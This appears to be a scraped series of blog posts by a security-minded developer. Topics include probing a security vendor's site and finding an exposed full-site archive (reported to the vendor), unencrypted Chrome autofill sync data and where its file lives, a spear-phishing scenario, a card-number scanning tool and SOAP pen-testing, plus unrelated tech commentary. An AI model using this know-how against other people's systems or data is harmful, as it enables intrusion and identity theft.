<p><img src="http://adamcaudill.com/files/2012-01-23_1716.png" alt="" /></p>

<p>I was hoping to run into the firewall (for lack of a better term) - looks like I got my wish; though since I wasn&#8217;t using anything automated and was just poking around by hand, it didn&#8217;t have any impact. Not terribly exciting, but it did provide some insight into what they are doing.</p>

<p>So far we&#8217;ve found a few interesting things, and bumped into their firewall, but that all pales in comparison to the last entry in the <code>dwsync.xml</code> file:</p>

<pre><code>&lt;file name="local-site.zip"
 server="ftp.belincreative.com/public_html/clients/mykonos/site/"
 local="129695851046591796"
 remote="129695888400000000"/&gt;
</code></pre>

<p>When I saw the file name I was shocked - could it really be? But I was right. It&#8217;s a 59MB file containing everything on the site - all the PHP and everything else. Out of curiosity, I compared the <code>.htaccess</code> to that in the zip file, as expected it&#8217;s quite different and more believable:</p>

<pre><code>Options +FollowSymlinks
RewriteEngine on
rewritecond %{http_host} ^mykonossoftware.com [nc]
rewriterule ^(.*)$ http://www.mykonossoftware.com/$1 [r=301,nc]
</code></pre>

<p>That confirms what I suspected, the file I saw earlier was just part of the trap.</p>

<p><strong>So what have we learned?</strong></p>

<p>1). Mykonos makes a really cool product, and had I not known what I was up against (and thus less skeptical about everything) it probably would have killed a lot of my time - just as intended.</p>

<p>2). No matter what you put in front or your site or application,<em> human mistakes are still your greatest risk</em>. A second set of eyes and a little paranoia go a long way in securing your systems, and stopping hackers.</p>

<p>3). Mykonos was either lucky or smart in that there was little on their site that shouldn&#8217;t be seen by the public. If they were using a CMS with a database back-end instead of simple (mostly-)static pages, this could have been worse. If they had source code or other valuable IP on the server, a mistake like this could be devastating.</p>

<p>4). Mykonos should take some of their new-found cash and hire somebody to finish the audit of their site that I started. ;)</p>

<p><em>Note:</em> I notified Mykonos about that zip file before posting this (through a couple of channels), and I&#8217;m intentionally not linking to it. While I didn&#8217;t see anything in there that would be an issue to be publicly disclosed, I&#8217;m sure they don&#8217;t want it getting out. Hopefully by the time anybody reads this, they will have taken care of that file.</p>

<p><em><strong>Update:</strong></em> As expect, they&#8217;ve cleaned up the files I mentioned - and a bit more. In a <a href="http://twitter.com/#!/dkoretz/status/162033710202486786">tweet</a> from the company&#8217;s CEO, <a href="http://www.davidkoretz.com/">David Koretz</a>, he mentioned that they had left a surprise for me. So I went to my starting point (the <code>/Templates/</code> directory), and was greeted with this:</p>

<p><img src="http://adamcaudill.com/files/2012-01-25_0005.png" alt="Welcome &amp; Thanks" /></p>

<p>Yeah, cool product and cool people. I&#8217;m impressed.</p>

      <title>Google Chrome Leaking Credit Card Data?</title>
      <description><p>While testing <a href="https://github.com/adamcaudill/ccsrch">ccsrch</a> I noticed a number that looked familiar - my debit card number. Now, being just a little paranoid, I don&#8217;t leave such information on my system unencrypted - so seeing it was a real surprise. But, here&#8217;s the real kicker: it was on my work PC, where it never should have been. But there it was, plain as day, in clear text. I spent a couple of minutes staring at the log trying to figure out why it would be there.</p>

<p>Once I saw the file name, a sinking feeling set in and the answer became clear:</p>

<p><code>%LocalAppData%\Google\Chrome\User Data\Default\Sync Data\SyncData.sqlite3</code></p>

<p>So it turns out that it&#8217;s Chrome&#8217;s <a href="http://support.google.com/chrome/bin/answer.py?hl=en&amp;answer=165139">sync</a> feature that was saving my information, but why?</p>

<p>It turns out that auto-fill data is synced with your Google account (if you&#8217;re signed in and have the feature enable, of course), and all of the computers you&#8217;re signed into - and by default, without the benefit of encryption. This file may contain any number of things, from mine I was able to extract the following:</p>

<ul>
<li><p>Full name</p></li>
<li><p>Wife&#8217;s full name</p></li>
<li><p>Date of birth</p></li>
<li><p>Wife&#8217;s date of birth</p></li>
<li><p>Social Security Number</p></li>
<li><p>Multiple credit card numbers</p></li>
<li><p>Multiple <a href="http://en.wikipedia.org/wiki/Card_security_code">CVV</a>s</p></li>
<li><p>Bank account &amp; routing number</p></li>
</ul>


<p>Not to mention quite a few websites I&#8217;ve been to, various addresses, employer&#8217;s name and other various useful tidbits. All would be quite useful for identity theft or highly targeted <a href="http://www.fbi.gov/news/stories/2009/april/spearphishing_040109">spear phishing</a>.</p>

<p>Now am I saying that syncing auto-fill is bad? No, not at all. It&#8217;s a very useful time saver, but what takes it from a useful feature to security issue is the fact that by default, this <em>data isn&#8217;t encrypted</em>!</p>

<p><img src="http://adamcaudill.com/files/2012-01-15_0905.png" alt="Default Encryption Setting" /></p>

<p><strong>What are the risks?</strong></p>

<p>There are three significant risks I see here:</p>

<p>1). <em>Disclosure to less trusted systems</em>:</p>

<p>In my case, I trust my laptop to be secure; between full-disk encryption (via <a href="http://www.truecrypt.org/">TrueCrypt</a>) and other precautions, I know that I don&#8217;t have too much to worry about. On the other hard, my Work PC is on a corporate domain, and at least a couple dozen people have permissions sufficient to access my personal files - thus I don&#8217;t trust anything too valuable on it.</p>

<p>Now because of the fact that this feature is insecure by default, that data is exposed to a less trusted system.</p>

<p>It can also go the other way: a number of auto-fill entries on my personal laptop were from forms on internal-only applications that only my Work PC would be able to access. So this means that anything sensitive could be leaked to home networks which are typically less secure than corporate environments. If you routinely handle PCI, HIPAA, or other restricted information - this type of leak could be a major issue.</p>

<p>2). <em>Spear Phishing</em>:</p>

<p>Let&#8217;s imagine a scenario:</p>

<p>You work for a defense contractor and I work for a foreign intelligence agency. Through some targeted attacks I manage to penetrate your home network, but have been unable to make it into your corporate network. I grab the sync database file from your home PC and extract one of your credit card numbers. I look up the <a href="http://en.wikipedia.org/wiki/List_of_Issuer_Identification_Numbers">IIN</a> and find out what bank the card is from. Once I have this, I build a PDF with the latest 0day exploit, and send it with a convincing subject line:</p>

<p>&#8220;Important Information about your Bank of America credit card ending in 7850&#8221;</p>

<p>Normally you&#8217;d dismiss it as spam, but the last four digits are right - so you open it, just in case. The exploit kicks in. I&#8217;m in, you&#8217;re done.</p>

<p>This is just a simple and quite contrived example, but you get the idea.</p>

<p>3). <em>Google Data Mining</em>:</p>

<p>This is the most paranoid and least likely, but given Google&#8217;s issues in controlling their people - I&#8217;d say not impossible (see <a href="http://www.electronista.com/articles/10/05/14/google.admits.collecting.wi.fi.info.with.map.team/">here</a>, <a href="http://searchengineland.com/google-chrome-page-will-have-pagerank-reduced-due-to-sponsored-posts-106551">here</a>, and <a href="http://boingboing.net/2012/01/13/google-fraudulently-solicits-f.html">here</a>).</p>

<p>Just for a moment, think about the fact that Google has the following:</p>

<ul>
<li><p>Your account data (name, email, etc.)</p></li>
<li><p>Your auto-fill history (see the list of items I found above)</p></li>
<li><p>Tons of data from their other services</p></li>
<li><p>At least parts of your browsing history, if not much of it</p></li>
<li><p>Engineers that truly enjoy data mining</p></li>
</ul>


<p>Most other companies I wouldn&#8217;t worry about; but knowing the people that Google hires, and the skill they have in manipulating data - you know that some engineer is using his <a href="http://www.nytimes.com/2007/10/21/jobs/21pre.html">20% time</a> to do this (or at least is wishing he could).</p>

<p>If nothing else, I know if I worked at Google - playing with this data would be tons of fun. ;)</p>

<p><strong>Want to see your data?</strong></p>

<p>To see what Chrome has saved about you, download <a href="http://sqlitebrowser.sourceforge.net/">SQLite Browser</a>, and open the file I mentioned above. Go to the &#8220;Browse Data&#8221; tab, and select the &#8220;metas&#8221; table. What you&#8217;re looking for is in the &#8220;non_unique_name&#8221; column (among other places). You should see something like this:</p>

<p><img src="http://adamcaudill.com/files/2012-01-15_0942.png" alt="SQLite Browser" /></p>

<p>The entries starting with &#8220;autofill_entry&#8221; are the ones you are interested in, but you&#8217;ll likely find some of the other records interesting as well. If you see the word &#8220;encrypted&#8221; then your data is already encrypted, and you don&#8217;t have to worry about this.</p>

<p><strong>Is this a vulnerability in Chrome?</strong></p>

<p>No, not at all - though it was a mistake. They should encrypt everything by default, and not provide an option to do otherwise. There&#8217;s no reason to expose users to a potential security risk when there&#8217;s a simple fix. Security isn&#8217;t something users should have to opt-in to; and unless there&#8217;s a very good reason, they shouldn&#8217;t have a way to opt-out.</p>

<p>Google should understand security and the value of the data they hold; they should be more responsible for the data (and faith) people give them.</p>

<p><strong>How do I fix it?</strong></p>

<p>Simple, from the &#8220;wrench&#8221; menu, select Options -> Personal Stuff -> Sign In -> Advanced&#8230; and then under &#8220;Encrypted data types&#8221; select &#8220;Encrypt all synced data&#8221; - and that&#8217;s it. After a couple of minutes the entries that were visible before will now just display the word &#8220;encrypted.&#8221;</p>

<p><img src="http://adamcaudill.com/files/2012-01-15_0944.png" alt="Encrypt all data" /></p>

<p>You can also go a step further, and get rid of this data by disabling auto-fill to ensure that potentially sensitive information isn&#8217;t being persisted when it shouldn&#8217;t be.</p>

      <title>CCSRCH v1.0.5</title>
      <description><p>During my employers annual <a href="https://www.pcisecuritystandards.org/">PCI</a> audit, our auditor requested that we perform a search of all of our servers for credit card data. He recommended a tool called &#8220;ccsrch&#8221; - which like many open source projects had a couple of issues, and hadn&#8217;t been updated in years. So, I fixed it.</p>

<p>CCSRCH is a cross-platform, command-line application that reads every file from the starting point passed in, and scans them for what looks like credit card numbers (and using the <a href="http://en.wikipedia.org/wiki/Luhn_algorithm">Luhn algorithm</a> to check each possible result). It&#8217;s fairly brute-force, but it gets the scans required for PCI - though I would be careful about using it during production hours, it can have a pretty significant impact on a server&#8217;s I/O performance.</p>

<p>I&#8217;ve forked the application and setup a new <a href="https://github.com/adamcaudill/ccsrch">ccsrch</a> project over at github (the original is on <a href="http://sourceforge.net/projects/ccsrch/">SourceForge</a>), and made a few modifications to better suit my needs (from the <a href="https://github.com/adamcaudill/ccsrch#readme">change log</a>):</p>

<ul>
<li><p>Added option to output the file name, and how many hits were found to the console when using -o (see -c in usage).</p></li>
<li><p>Added option to limit the number of results from a single file before going on to the next file (see -l in usage).</p></li>
<li><p>Added option to exclude certain file types from the scan (see -n in usage).</p></li>
<li><p>Fix for ignoring NULL, CR &amp; LF.</p></li>
<li><p>Ignore dash when scanning.</p></li>
<li><p>Exclude results with the last 8 digits repeating (very unlikely to be a real PAN).</p></li>
</ul>


<p>I&#8217;ve <a href="https://github.com/adamcaudill/ccsrch/downloads">uploaded</a> a Windows build of the new 1.0.5 release to github, and for *nix systems, you can just download the latest <a href="https://github.com/adamcaudill/ccsrch/tags">tag</a>.</p>

      <title>SOPA Is Inevitable</title>
      <description><p><a href="http://en.wikipedia.org/wiki/Stop_Online_Piracy_Act">SOPA</a>, while it&#8217;s not likely to be passed as-is, I would be willing to bet money that something SOPA-like will be passed. It may be watered down with many of the most offending parts removed, but for those backing SOPA it&#8217;ll still be a real victory. For them getting it on the books, even in a weakened form means it can be tweaked (and extended) later.</p>

<p>There&#8217;s been an amazing resistance to SOPA, from the <a href="http://arstechnica.com/tech-policy/news/2011/12/victory-boycott-forces-godaddy-to-drop-its-support-for-sopa.ars">boycott of GoDaddy</a> to public statements from celebrities such as <a href="http://www.popularmechanics.com/science/mythbusters/articles/mythbuster-adam-savage-sopa-could-destroy-the-internet-as-we-know-it-6620300">Adam Savage</a> - the public outcry against this horrid piece of legislation has been quite inspiring. But how often will you be able to get so many people to stand up and take action before they start to lose interest? How many times can you raise the troops before the numbers start to dwindle; how long before the celebrities start fearing they&#8217;ll be branded in the media as extremist or crazy? How many times can you raise the call of breaking the internet and freedom of speech before the public gets bored and goes to read about the latest Hollywood divorce instead?</p>

<p>Here&#8217;s how I see it going:</p>

<ol>
<li><p>Strip many of the worst parts of SOPA and get it through congress. By removing these offending pieces, those backing SOPA will try to make themselves look responsive to the community, and it&#8217;ll be played as a victory for the community in the media. All in all, if you aren&#8217;t paying attention it&#8217;ll look like a victory for the people.</p></li>
<li><p>Next year, introduce a bill to modify SOPA to change the wording here are there, edging it just a little closer to the original. If done carefully, it&#8217;ll be easy to dismiss those that try to stir up another outcry as over-reacting or even paranoid.</p></li>
<li><p>In a few years after a series of modifications, we have SOPA, just as broad and dangerous as originally intended - and the vast majority of people who fought SOPA would have no idea.</p></li>
</ol>


<p>If you have a financial motivation to get something like this passed, they key to success would be patience. Chip away slowly at <a href="http://www.chillingeffects.org/dmca512/">DMCA Safe Harbor</a> protections, at what requires a judge instead of an administrative action, at transparency so that any action ends up happening behind closed doors. In enough time you&#8217;ve established a law that gives the US Federal Government a massive amount of control of the internet, without oversight - all in a way designed to get offending web sites off the internet as quickly as possible. To say it would be ripe for abuse would be a massive understatement.</p>

<p>Am I being paranoid? I honestly hope so - I really hope that there aren&#8217;t people out there looking to limit the freedoms we cherish for their own profit, but the fact that SOPA was introduced in the first place makes that hard to believe.</p>

      <title>Masking Credit Cards for PCI</title>
      <description><p>PCI DSS, the security standard for companies that handle credit cards, defines a number of <a href="https://www.pcisecuritystandards.org/pdfs/pci_audit_procedures_v1-1.pdf">rules</a> as to how credit cards are handled. One of those rules, 3.3, is defined as follows:</p>

<p><em>Mask PAN when displayed (the first six and last four digits are the maximum number of digits to be displayed)</em></p>

<p>So based on this requirement I assumed that the code to do this would be common and widely available; much to my surprise there are rather few samples that do this, and of those I found they only showed the last four (which when you are handling a lot of credit cards, searching for an account by the last four isn&#8217;t all that helpful) and were often rather fragile.</p>

<p>So I whipped this up, hopefully it&#8217;ll be useful to others.</p>

      <title>Why Cringely is wrong about Java</title>
      <description><p>A couple of days ago I was sent a link to Robert Cringely&#8217;s latest treatise:  <em><a href="http://www.cringely.com/2011/10/the-second-coming-of-java/">The second coming of Java</a></em> - and to say I disagreed was a bit of an understatement. To me, it represents a fundamental flaw in his perception of developers, and more importantly the economics of software development.</p>

<p>The key to Cringely&#8217;s argument comes down to this:</p>

<p>When SSDs gain enough capacity there will be a shift from the Ruby world back to the Java world. Not for prototyping, because, well, it’s prototyping. But simply because the statement “<strong>Ruby is <em>incredibly</em> slow but I don’t care because my database is slower</strong>” will no longer be true.</p>

<p>What he&#8217;s missing here is the real reason people use frameworks like Rails; it&#8217;s not about it being Ruby, or being the latest cool thing - it&#8217;s about developer productivity. That&#8217;s it, and that&#8217;s all there is to it - Rails allows a developer to do more in less time. That&#8217;s one of the key reasons so many Java web developers jumped ship (though I can think of a few others), and what pushed Microsoft to invest so heavily in their <a href="http://www.asp.net/mvc">MVC framework</a>.</p>

<p>I could fully rehash the argument, but in what I consider to be one of Jeff Atwood&#8217;s best articles,  <em><a href="http://www.codinghorror.com/blog/2008/12/hardware-is-cheap-programmers-are-expensive.html">Hardware is Cheap, Programmers are Expensive</a></em>, he covers a key point to my argument - developer time is vastly more expensive than hardware. Atwood&#8217;s take on the issue is clear:</p>

<p>Clearly, <strong>hardware is cheap, and programmers are expensive</strong>. Whenever you&#8217;re provided an opportunity to leverage that imbalance, it would be incredibly foolish not to.</p>

<p>When there&#8217;s a choice between developer productivity, and spending money on hardware - the conclusion should be the same. It&#8217;s much cheaper to throw more hardware at a slower framework than it is to invest more developer time in a faster framework. For any non-trivial application, throwing more front-end servers at it will always be cheaper than slowing the development process down with a non-productivity-centric toolkit.</p>

<p>It&#8217;s simple economics; server hardware is getting faster and cheaper, developer time is only getting more expensive.</p>

      <title>Pen-Testing Silverlight+RIA with SoapUI</title>
      <description><p>I was recently given the task of ensuring that a Silverlight+RIA application that could contain private information was secure for deployment to a public web site. So I started searching for automated pen-testing tools that could work against Microsoft&#8217;s Binary SOAP protocol (<code>msbin1</code>, a.k.a <code>application/soap+msbin1</code>) and found only disappointment. For various reasons, it&#8217;s significantly more complex to pen-test a application using <code>msbin1</code> than traditional <code>SOAP</code> + <code>WSDL</code>.</p>

<p>To properly test the services, I had to make a compromise: temporarily modify the application to expose a <code>SOAP</code> endpoint. While this changes the state of the application and thus reduces the validity of the tests, it does provide a reasonable way of testing the web services to ensure that they are behaving as intended.</p>

<p>The recently released <a href="http://www.soapui.org/About-SoapUI/go-pro.html">SoapUI Pro 4</a> adds new <a href="http://www.soapui.org/Security/getting-started.html">security testing tools</a> that makes this a viable (and attractive option). To get this working, there are a few small changes that need to be made to the solution:</p>

<p>First, you&#8217;ll need to add a reference to <code>Microsoft.ServiceModel.DomainServices.Hosting.EndPoints</code> which is part of the RIA Services Toolkit; this allows you to expose different End Points for the service such as <code>SOAP</code> and <code>OData</code>.</p>

<p>Next, you&#8217;ll want to add the following <code>configSections</code> entry to your <code>Web.config</code>:</p>

<pre><code>&lt;configuration&gt;
 &lt;configSections&gt;
   &lt;sectionGroup name="system.serviceModel"&gt;
     &lt;section name="domainServices"
      type="System.ServiceModel.DomainServices.Hosting.DomainServicesSection,
      System.ServiceModel.DomainServices.Hosting,
      Version=4.0.0.0,
      Culture=neutral,
      PublicKeyToken=31bf3856ad364e35" /&gt;
   &lt;/sectionGroup&gt;
 &lt;/configSections&gt;
 ...
</code></pre>

<p>Finally, to expose the <code>SOAP</code> end point:</p>

<pre><code>&lt;configuration&gt;
 ...
 &lt;system.serviceModel&gt;
  ...
  &lt;domainServices&gt;
   &lt;endpoints&gt;
    &lt;add name="Soap"
     type="Microsoft.ServiceModel.DomainServices.Hosting.SoapXmlEndpointFactory,
     Microsoft.ServiceModel.DomainServices.Hosting,
     Version=4.0.0.0,
     Culture=neutral, PublicKeyToken=31bf3856ad364e35" /&gt;
   &lt;/endpoints&gt;
  &lt;/domainServices&gt;
  ...
</code></pre>

<p>Finally, just follow the <a href="http://www.soapui.org/Security/security-scans-overview.html">instructions</a> for SoapUI to setup your tests, and you can feel (just a little) more confident in your application. Passing with flying colors obviously doesn&#8217;t mean your application is bulletproof, but it helps to confirm that web service code is solid.</p>

<p>Now, while this does provide some insight into your application and should help find common issues, it&#8217;s not a replacement for a professional assessment by a qualified auditor. If you are handling credit cards or other highly targeted information, <em>please</em> consult a security specialist before a public deployment.</p>

<p><strong>Update:</strong> Another option is a <a href="http://portswigger.net/burp/">Burp</a> plug-in offered by Gotham Digital Science, and can be found <a href="http://blog.gdssecurity.com/labs/2009/11/19/wcf-binary-soap-plug-in-for-burp.html">here</a>. It&#8217;s a more complex workflow, but allows testing without an exposed SOAP end-point - which is great if you don&#8217;t have source code access.</p>

      <title>A brief look at the latest @LulzSec release</title>
      <description><p>Earlier today, the hacker collective <a href="http://lulzsecurity.com/">Lulz Security</a> released a batch of 62,156 email/password combinations from unknown sites; I decided to take a look at the data and see if there was anything to be learned from it.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>And as always, LulzSec delivers: <a href="http://t.co/yQlcu5x" title="http://www.mediafire.com/?9em5xp7r0rd2yod">mediafire.com/?9em5xp7r0rd2y…</a> 62,000+ emails/passwords just for you. Enjoy.</p>&mdash; The Lulz Boat (@LulzSec) <a href="https://twitter.com/LulzSec/status/81327464156119040">June 16, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>So, let&#8217;s take a look at a few stats:</p>

<p>Total Domains: ~5,230</p>

<p>Top 15 Domains:</p>

<p><img src="http://adamcaudill.com/files/2011-06-16_1922.png" alt="Top 15 Domains" /></p>

<p>There are over 50,000 unique passwords, but even with this many passwords, there&#8217;s still a few quite common - and very bad passwords in use:</p>

<p><img src="http://adamcaudill.com/files/2011-06-16_1936.png" alt="Top Passwords" /></p>

<p>While this is a fairly small release, the <a href="http://twitter.com/#!/LulzSec/">LulzSec</a> twitter stream has a number of entries like these:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>There is some very angry level 85 WoW player cutting his wrists right now, thanks to @<a href="https://twitter.com/miraclejoe">miraclejoe</a> and LulzSec. Let it flow&#8230;</p>&mdash; The Lulz Boat (@LulzSec) <a href="https://twitter.com/LulzSec/status/81334551686815745">June 16, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>There are several tweets about people accessing Facebook, Twitter, and even Amazon accounts - what&#8217;s so unfortunate here is that service providers could easily restrict accounts on lists like this to protect the users and greatly reduce the impact of these breaches.</p>

<p>Until people learn that password reuse is dangerous, this will keep happening.</p>

<p><em>Update:</em> I&#8217;ve removed a link to a tweet, as the account has since been removed. The tweet said: &#8220;@LulzSec Cheers for the paypal account with £250 in it! ;)&#8221;</p>

      <title>bbPress 2.0 (beta-1) released!</title>
      <description><p>This morning, the latest version of my favorite forum software, bbPress, was <a href="http://bbpress.org/blog/2011/05/bbpress-2-0-beta-1/">released</a>. While this is a beta and not a final release, it&#8217;s still a major event for the project: this release is in the form of a WordPress plugin, instead of a stand-alone application as it&#8217;s been in the past. In December 2009 <a href="http://adamcaudill.com/2009/12/16/bbpress-is-the-end-near/">I wrote about this decision</a> - and at the time I was rather disappointed with the change in direction; but now my views have changed. I&#8217;m also excited to see that <a href="http://ma.tt/">Matt</a> and his company, <a href="http://automattic.com/">Automattic</a> have decided to invest the time and money needed to make this happen; there for a while it looked like bbPress really was dying.</p>

<p>Thanks to services like <a href="http://stackexchange.com/">StackExchange</a> and its numerous clones, it seems the days of standalone forums are numbered; when combined with the increasing strength of WordPress as a full-blown CMS, this move actually makes a lot of sense.</p>

<p>I&#8217;m excited both as a user and developer - this opens many new doors from both perspectives, and will certainly increase adoption of the software, as integration with the current version is <a href="http://adamcaudill.com/2011/03/06/bbpress-wordpress-3-1-registration-issues/">a bit tricky</a>.</p>

<p>Congratulations to the entire team on this release; it really is a major milestone for the project!</p>

      <title>Happy 20th birthday Visual Basic!</title>
      <description><p>Today I saw a post on Facebook by a friend of mine, <a href="http://inotifythoughtschanging.net/blog/">Anthony Green</a>, about writing his first blog post as a Microsoft employee (he has a personal blog as well, unfortunately he&#8217;s not written anything since 2008) - when I saw the title, I couldn&#8217;t believe it was 20 years already - seems just yesterday that I wrote about its <a href="http://adamcaudill.com/2006/05/27/happy-belated-birthday-vb/">15th birthday</a>:</p>

<p><a href="http://blogs.msdn.com/b/vbteam/archive/2011/05/20/happy-20th-birthday-visual-basic.aspx">Happy 20th Birthday Visual Basic!</a></p>

<p>My, what a journey it&#8217;s been. Almost fifteen years ago I randomly bought a copy of &#8220;Visual Basic 5: Deluxe Learning Edition&#8221; - I was just 15 at the time and wanted a new hobby, and writing software seemed like it would be fun. In those early days, I had no idea what career I would choose, and really didn&#8217;t intend for software development to become the dominant force in my life - I just wanted a better, more productive way to spend my time during the summer.</p>

<p>In the years that have went by, I became passionate about the field, and all it encompasses (possible obsessed, if you believe my wife) - it&#8217;s been the driving force in my life. Today, I manage a team of 6 developers, and have a fun start-up with some friends (that someday won&#8217;t cost me money every month) - and all because I bought that book. Overall, I have a lot to thank VB for, it really did get me started in this field.</p>

<p>Today though, my language of choice has moved on to newer options - I prefer bleeding technologies when I can use them - but VB will always have a place in my heart, and I&#8217;ll always follow its progress as it continues to transform and adapt to an ever-changing world. As the most popular .NET language (contrary to what many of the C# developers think), it plays a vital role in the development of the framework and the ecosystem.</p>

<p>In the conversations I&#8217;ve had with Anthony about the future of the language, I greatly look forward to writing about its 25th birthday; I expect those will be exciting times for the language and the entire .NET ecosystem.</p>

      <title>VB6: Not so open source</title>
      <description><p>Earlier today, a rather surprising tweet hit, being retweeted at least 80 times, including by a few rather influential people in the .NET world:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>Microsoft announces to mvps at <a href="https://twitter.com/search/%23msteched">#msteched</a> that VB6 will be released as open source on codeplex end of june! w00t</p>&mdash; Roy Osherove (@RoyOsherove) <a href="https://twitter.com/RoyOsherove/status/71287262842859520">May 19, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Needless to say, that&#8217;s not an announcement that anybody was expecting, but given the talk going on at the time - and the high-profile people talking about it, there wasn&#8217;t much reason to doubt. Announcing a product that has been dead for years is going open source would certainly be a strategy shift for Microsoft, but does it make any sense? <a href="http://twitter.com/#!/kevindente">Kevin Dente</a> of <a href="http://herdingcode.com/">Herding Code</a> fame certainly thought that Microsoft had better things to release:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>Instead of VB6 I&#8217;d rather see MS open source IE6. Then at least we could build a standalone version of it.</p>&mdash; Kevin Dente (@kevindente) <a href="https://twitter.com/kevindente/status/71292995185553408">May 19, 2011</a></blockquote>

<p>Shortly after the initial tweet, <a href="http://www.dougseven.com/">Doug Seven</a>, the Director of Product Management, Visual Studio Tools &amp; Languages, <a href="http://twitter.com/#!/dseven/status/71316722854002688">replied</a> asking Roy Osherove (the original poster) to email him. Hmm, it&#8217;s starting to smell like something odd is going on. A couple of hours later, Doug set the story straight:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>The rumors of VB6 going open source are simply not true. <a href="https://twitter.com/search/%23msteched">#msteched</a> <a href="https://twitter.com/search/%23vb6rumor">#vb6rumor</a> <a href="https://twitter.com/search/%23vb6">#vb6</a></p>&mdash; dseven (@dseven) <a href="https://twitter.com/dseven/status/71352709785198592">May 19, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>To which, Roy then tried to unset:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>RT @<a href="https://twitter.com/dseven">dseven</a>: The rumors of VB6 going open source are true. <a href="https://twitter.com/search/%23msteched">#msteched</a> <a href="https://twitter.com/search/%23vb6rumor">#vb6rumor</a> <a href="https://twitter.com/search/%23vb6">#vb6</a></p>&mdash; Roy Osherove (@RoyOsherove) <a href="https://twitter.com/RoyOsherove/status/71355603611680769">May 19, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>It&#8217;s worth pointing out that Roy Osherove currently has a full ten-times the followers that Doug Seven has, meaning his altered retweet was seen by more people (at least initially). For several hours word was going around, and accepted by a number of people who thought Microsoft was actually going to open the code to VB6 (including journalists who were too busy writing articles to do any fact checking) - all based on one person who made it all up.</p>

<p>Lesson here: be careful about what you re-tweet, it&#8217;s easy to endorse a lie as several people unwittingly did today (<a href="http://twitter.com/#!/blowdart">@blowdart</a> summed it <a href="http://twitter.com/#!/blowdart/status/71370740934524928">rather well</a>).</p>

      <title>Errors on &#39;gem install mysql2&#39;</title>
      <description><p>On my fresh Ubuntu 11.04 box running Ruby 1.9.2 instead of the standard Ruby 1.8, I ran into some undocumented errors while installing the <code>mysql2</code> gem. Here&#8217;s what I was seeing:</p>

<pre><code>$ gem install mysql2
Building native extensions.  This could take a while...
ERROR:  Error installing mysql2:
    ERROR: Failed to build gem native extension.

        /usr/bin/ruby1.9.1 extconf.rb
          &lt;internal:lib/rubygems/custom_require&gt;:29:in `require': 
          no such file to load -- mkmf (LoadError)
    from &lt;internal:lib/rubygems/custom_require&gt;:29:in `require'
    from extconf.rb:2:in `&lt;main&gt;'


Gem files will remain installed in 
  /usr/lib/ruby/gems/1.9.1/gems/mysql2-0.3.2 for inspection.
Results logged to 
  /usr/lib/ruby/gems/1.9.1/gems/mysql2-0.3.2/ext/mysql2/gem_make.out
</code></pre>

<p>This obviously isn&#8217;t all that helpful, nor did I find anything all that useful on Google - thankfully the issue is easy to solve. All that&#8217;s needed is to ensure that the following packages are installed:</p>

<pre><code>sudo apt-get install libmysqlclient-dev libmysql-ruby1.9 ruby1.9.1-dev
</code></pre>

<p>Then you can try installing the gem, it should work, hopefully</p>

      <title>Facebook Scams</title>
      <description><p>As a tip for all my Facebook friends, despite the promises you see spreading wildly across Facebook, you can&#8217;t see who&#8217;s looking at your profile. If you ever see anything like this, it&#8217;s a scam - pure and simple:</p>

<p><img src="http://adamcaudill.com/files/2011-05-14_2015.png" alt="" /></p>

<p>If you ever see a page like this, or one that asks you to paste a script into your address bar as this one does, <em>please</em> immediately report the page. If you see any of your friends &#8216;like&#8217; a page like this or send messages linking to something like this, please warn them - they have likely handed their account over to a scammer or other bottom-dwelling script-kiddy.</p>

<p>If you were unfortunate enough to get a message from a friend and believe what it said; your account is in somebody else&#8217;s hands and is being used to spam your friends with a message recommending the same scam to them. Odds are, your account will later be sold to others for spamming - <strong>Facebook accounts are sold</strong> thousands at a time, and last I saw they go for about $3 each, sometimes more if a person has enough friends.</p>

<p>The best thing you can do if this happens to you is <strong>change your password</strong>, check the email address and other information listed on your account, then check all of your permissions, including what applications have access to your account. These people move fast, and they can sell accounts several times over, so don&#8217;t assume once you change your password all will be good - they&#8217;ve probably changed your email address or opened some other means to take your account back so they can keep making money from it.</p>

<p>Be careful and be paranoid, there really are people out to get you.</p>

      <title>Microsoft &amp; Skype: PR Failure?</title>
      <description><p>While looking at the reactions to Microsoft&#8217;s <a href="http://www.microsoft.com/Presspass/press/2011/may11/05-10CorpNewsPR.mspx">acquisition of Skype</a>, I found one tweet that really stood out:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>How you know you have a PR problem: As soon as you buy popular service X, their userbase starts posting alternatives <a href="https://twitter.com/search/%23skype">#skype</a> <a href="https://twitter.com/search/%23Microsoft">#Microsoft</a></p>&mdash; Ted Han (@knowtheory) <a href="https://twitter.com/knowtheory/status/68139224028819456">May 11, 2011</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>While many users are busy joking about names (personally my money is on &#8220;Microsoft Live Skype&#8221; - my only hope is that there isn&#8217;t an &#8220;Ultimate Edition&#8221; or &#8221;<a href="http://twitter.com/#!/shanselman/status/68147795852394496">Unicorn Edition</a>&#8221; tacked to the end of the name) Microsoft has a significant problem, and I really hope they are looking at public reaction. Users are concerned; what will Microsoft do to the brand, and how will the brand and service change - users need to be reassured that what they love about the service won&#8217;t go away.</p>

